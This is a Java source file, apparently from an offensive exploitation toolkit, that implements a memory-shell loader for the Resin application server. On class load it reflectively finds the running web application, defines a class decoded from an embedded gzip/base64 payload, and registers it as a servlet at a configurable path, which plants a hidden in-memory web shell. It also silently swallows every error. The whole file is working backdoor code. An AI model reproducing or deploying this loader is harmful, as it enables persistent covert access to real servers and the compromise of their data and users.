package com.ppp.middleware.loader;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * <p>
 */
@Middleware(Middleware.Resin)
@MemShell(MemShell.Servlet)
@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH, JavaClassModifiable.NAME})
public class ResinServletThreadLoader {
    private static String gzipObject;
    private static String CLASSNAME;
    private static String PATH;
    private static String NAME;

    public ResinServletThreadLoader() {
    }

    static {
        try {
            inject();
        } catch (Throwable e) {

        }
    }

    /**
     * Resin Servlet
     */
    public static void inject() throws Exception {
        Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

        for (int i = 0; i < threads.length; i++) {
            try {
                Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                if (webapp == null) {
                    continue;
                }

                try {
                    Object _servletManager = getFieldValue(webapp, "_servletManager");
                    HashMap _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
                    if (_servlets.containsKey(NAME)) {
                        return;
                    }
                } catch (Exception e) {

                }

                // 动态代理兼容 javax jakarta
                Class servletClass = null;
                try {
                    servletClass = Class.forName("jakarta.servlet.Servlet");
                } catch (Exception e) {
                    try {
                        servletClass = Class.forName("javax.servlet.Servlet");
                    } catch (ClassNotFoundException ex) {

                    }
                }

                byte[] bytes = decompress(gzipObject);
                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz;
                try {
                    clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
                } catch (Exception e) {
                    clazz = classLoader.loadClass(CLASSNAME);
                }

                Object javaObject = clazz.newInstance();
                Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
                Object servletMapping = Class.forName("com.caucho.server.dispatch.ServletMapping").newInstance();
                invokeMethod(servletMapping.getClass().getSuperclass(), servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
                invokeMethod(servletMapping.getClass().getSuperclass(), servletMapping, "setServletName", new Class[]{String.class}, new Object[]{NAME});
                invokeMethod(servletMapping.getClass(), servletMapping, "addURLPattern", new Class[]{String.class}, new Object[]{PATH});

                setFieldValue(servletMapping, "_singletonServlet", object);
                invokeMethod(webapp.getClass(), webapp, "addServletMapping", new Class[]{Class.forName("com.caucho.server.dispatch.ServletMapping")}, new Object[]{servletMapping});
                return;
            } catch (Exception e) {

            }
        }
    }

    // tools
    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
